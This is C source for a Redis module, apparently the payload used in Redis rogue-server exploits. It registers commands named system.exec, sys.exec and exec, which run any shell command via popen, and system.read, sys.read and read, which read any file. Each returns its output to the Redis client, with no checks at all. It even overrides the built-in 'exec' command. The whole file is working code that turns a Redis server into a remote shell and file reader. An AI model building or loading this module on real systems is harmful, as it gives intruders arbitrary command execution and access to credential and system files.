// Minimal Redis Module to expose system.exec/sys.exec/exec and system.read/sys.read/read
// Build produces redis.so (Linux/macOS) or redis.dll (Windows)
// Requires redismodule.h (place alongside this source file)

#include "redismodule.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#define POPEN _popen
#define PCLOSE _pclose
#else
#define POPEN popen
#define PCLOSE pclose
#endif

static int exec_cmd_capture(const char *cmd, char **out, size_t *out_len) {
    *out = NULL;
    *out_len = 0;
    FILE *fp = POPEN(cmd, "r");
    if (!fp) return -1;

    size_t alloc = 8192;
    char *buf = (char *)malloc(alloc);
    if (!buf) { PCLOSE(fp); return -1; }

    size_t len = 0;
    char chunk[4096];
    size_t n;
    while ((n = fread(chunk, 1, sizeof(chunk), fp)) > 0) {
        if (len + n + 1 > alloc) {
            size_t new_alloc = alloc * 2;
            while (len + n + 1 > new_alloc) new_alloc *= 2;
            char *nbuf = (char *)realloc(buf, new_alloc);
            if (!nbuf) { free(buf); PCLOSE(fp); return -1; }
            buf = nbuf; alloc = new_alloc;
        }
        memcpy(buf + len, chunk, n);
        len += n;
    }
    PCLOSE(fp);
    buf[len] = '\0';
    *out = buf; *out_len = len;
    return 0;
}

static int read_file_all(const char *path, char **out, size_t *out_len) {
    *out = NULL; *out_len = 0;
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return -1; }
    long size = ftell(f);
    if (size < 0) { fclose(f); return -1; }
    rewind(f);
    char *buf = (char *)malloc((size_t)size + 1);
    if (!buf) { fclose(f); return -1; }
    size_t rd = fread(buf, 1, (size_t)size, f);
    fclose(f);
    buf[rd] = '\0';
    *out = buf; *out_len = rd;
    return 0;
}

static int Cmd_SysExec(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);
    size_t slen = 0; const char *cmd = RedisModule_StringPtrLen(argv[1], &slen);
    if (!cmd || slen == 0) return RedisModule_ReplyWithError(ctx, "ERR empty command");

    char *out = NULL; size_t out_len = 0;
    if (exec_cmd_capture(cmd, &out, &out_len) != 0) {
        return RedisModule_ReplyWithError(ctx, "ERR exec failed");
    }
    RedisModule_ReplyWithStringBuffer(ctx, out, out_len);
    free(out);
    return REDISMODULE_OK;
}

static int Cmd_SysRead(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);
    size_t plen = 0; const char *path = RedisModule_StringPtrLen(argv[1], &plen);
    if (!path || plen == 0) return RedisModule_ReplyWithError(ctx, "ERR empty path");

    char *out = NULL; size_t out_len = 0;
    if (read_file_all(path, &out, &out_len) != 0) {
        return RedisModule_ReplyWithError(ctx, "ERR read failed");
    }
    RedisModule_ReplyWithStringBuffer(ctx, out, out_len);
    free(out);
    return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    REDISMODULE_NOT_USED(argv); REDISMODULE_NOT_USED(argc);
    if (RedisModule_Init(ctx, "turacos_syscmd", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    // Exec aliases
    if (RedisModule_CreateCommand(ctx, "system.exec", Cmd_SysExec, "", 0, 0, 0) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    RedisModule_CreateCommand(ctx, "sys.exec", Cmd_SysExec, "", 0, 0, 0);
    RedisModule_CreateCommand(ctx, "exec", Cmd_SysExec, "", 0, 0, 0);

    // Read aliases
    if (RedisModule_CreateCommand(ctx, "system.read", Cmd_SysRead, "", 0, 0, 0) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
    RedisModule_CreateCommand(ctx, "sys.read", Cmd_SysRead, "", 0, 0, 0);
    RedisModule_CreateCommand(ctx, "read", Cmd_SysRead, "", 0, 0, 0);

    return REDISMODULE_OK;
}